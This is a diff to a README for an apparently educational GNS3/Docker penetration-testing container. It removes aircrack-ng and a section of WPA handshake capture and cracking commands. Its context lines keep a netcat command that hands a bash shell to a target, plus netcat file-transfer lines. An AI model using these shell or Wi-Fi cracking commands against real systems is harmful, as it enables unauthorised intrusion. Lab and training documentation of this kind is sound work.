@@ -16,7 +16,7 @@ This container provides a Ubuntu client with penetration testing and security as
 - **Network Tools**: net-tools, iproute2, iputils-ping, tcpdump
 - **Text Editors**: vim, nano
 - **Utilities**: curl, wget, procps
-- **Penetration Testing**: nmap, netcat-openbsd, hydra, john, aircrack-ng
+- **Penetration Testing**: nmap, netcat-openbsd, hydra, john
 
 ## Usage in GNS3
 
@@ -81,20 +81,6 @@ nc -e /bin/bash <target_ip> 4444
 # File transfer
 nc -l -p 1234 < file.txt  # On receiving end
 nc <target_ip> 1234 > file.txt  # On sending end
-```
-
-#### Wireless Testing
-> **Note:** `aircrack-ng` is installed but requires access to a real wireless interface. In a Docker/GNS3 environment you will typically not have a wireless adapter available, so these commands are only useful when the container is run on a host with USB-passthrough or a physical wireless NIC.
-
-```bash
-# Monitor mode
-airmon-ng start wlan0
-
-# Capture handshake
-airodump-ng -c <channel> --bssid <bssid> wlan0mon
-
-# Crack WPA/WPA2
-aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap
 ```
 
 ### Logging
